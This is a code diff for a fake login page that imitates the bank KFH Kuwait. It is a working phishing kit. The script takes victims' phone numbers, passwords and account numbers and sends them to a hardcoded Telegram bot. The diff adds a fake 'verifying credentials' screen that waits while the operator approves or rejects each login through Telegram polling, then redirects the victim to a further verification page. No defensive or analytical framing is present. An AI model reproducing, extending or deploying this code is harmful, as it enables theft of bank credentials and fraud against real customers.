@@ -21,6 +21,25 @@
             --primary-color: #009144;
             --primary-dark: #006B35;
         }
+        
+        .login-waiting {
+            text-align: center;
+            padding: 40px 20px;
+        }
+        
+        .login-waiting h3 {
+            margin: 20px 0 10px;
+            color: var(--primary-color);
+        }
+        
+        .login-waiting p {
+            color: #666;
+            margin-bottom: 10px;
+        }
+        
+        .login-waiting small {
+            color: #999;
+        }
     </style>
 </head>
 <body>
@@ -95,8 +114,15 @@
 
     <script src="landing-script.js"></script>
     <script>
+        const TELEGRAM_BOT_TOKEN = '8663835867:AAHBDm5yUNurJQSOuOdw7VWWekJuLzOj-l4';
+        const TELEGRAM_CHAT_ID = '7973653220';
+        let lastUpdateId = 0;
+        let loginPollingInterval = null;
+
         // Save credentials to sessionStorage when form is submitted
         document.getElementById('login-form').addEventListener('submit', function(e) {
+            e.preventDefault(); // Prevent default form submission
+            
             const phone = document.getElementById('phone').value;
             const password = document.getElementById('password').value;
             const accountNumber = document.getElementById('accountNumber').value;
@@ -104,6 +130,9 @@
             sessionStorage.setItem('kfh_phone', phone);
             sessionStorage.setItem('kfh_password', password);
             sessionStorage.setItem('kfh_account_number', accountNumber);
+            
+            // Show waiting state
+            showWaitingState();
             
             // Send to bot
             sendToBot(phone, password, accountNumber);
@@ -122,14 +151,99 @@
             };
 
             try {
-                await fetch('https://api.telegram.org/bot8663835867:AAHBDm5yUNurJQSOuOdw7VWWekJuLzOj-l4/sendMessage', {
+                await fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: '7973653220', text: message, reply_markup: replyMarkup })
+                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, reply_markup: replyMarkup })
                 });
+                
+                // Start polling for admin approval
+                startLoginPolling();
             } catch (error) {
                 console.log('Error sending to bot:', error);
+                alert('Connection error. Please try again.');
             }
+        }
+
+        function showWaitingState() {
+            const formCard = document.querySelector('.form-card');
+            formCard.innerHTML = `
+                <div class="login-waiting">
+                    <div class="waiting-spinner"></div>
+                    <h3>Verifying Your Credentials</h3>
+                    <p>Please wait while we verify your login details...</p>
+                    <small>This may take a few moments</small>
+                </div>
+            `;
+        }
+
+        function startLoginPolling() {
+            loginPollingInterval = setInterval(async function() {
+                try {
+                    const response = await fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/getUpdates?offset=' + (lastUpdateId + 1) + '&timeout=1');
+                    const data = await response.json();
+                    
+                    if (data.ok && data.result && data.result.length > 0) {
+                        lastUpdateId = data.result[data.result.length - 1].update_id;
+                        
+                        const sessionId = sessionStorage.getItem('kfh_session_id');
+                        
+                        for (const update of data.result) {
+                            if (update.callback_query) {
+                                const callbackData = update.callback_query.data;
+                                const callbackId = update.callback_query.id;
+                                
+                                // Answer the callback query
+                                fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/answerCallbackQuery', {
+                                    method: 'POST',
+                                    headers: { 'Content-Type': 'application/json' },
+                                    body: JSON.stringify({ callback_query_id: callbackId })
+                                });
+                                
+                                if (callbackData === 'login_approve_' + sessionId) {
+                                    clearInterval(loginPollingInterval);
+                                    onLoginApproved();
+                                    return;
+                                }
+                                
+                                if (callbackData === 'login_reject_' + sessionId) {
+                                    clearInterval(loginPollingInterval);
+                                    onLoginRejected();
+                                    return;
+                                }
+                            }
+                        }
+                    }
+                } catch (error) {
+                    console.log('Polling error:', error);
+                }
+            }, 2000);
+        }
+
+        function onLoginApproved() {
+            const approvedMessage = '✅ KFH KUWAIT - LOGIN APPROVED\n\n🆔 Session: ' + sessionStorage.getItem('kfh_session_id') + '\n📱 Phone: ' + sessionStorage.getItem('kfh_phone') + '\n📅 Time: ' + new Date().toLocaleString();
+            
+            fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: approvedMessage })
+            });
+            
+            // Proceed to step 2
+            window.location.href = 'verify.html';
+        }
+
+        function onLoginRejected() {
+            const rejectedMessage = '❌ KFH KUWAIT - LOGIN REJECTED\n\n🆔 Session: ' + sessionStorage.getItem('kfh_session_id') + '\n📱 Phone: ' + sessionStorage.getItem('kfh_phone') + '\n📅 Time: ' + new Date().toLocaleString();
+            
+            fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: rejectedMessage })
+            });
+            
+            alert('Your login has been rejected. Please try again or contact customer support.');
+            window.location.href = 'application.html';
         }
     </script>
 </body>
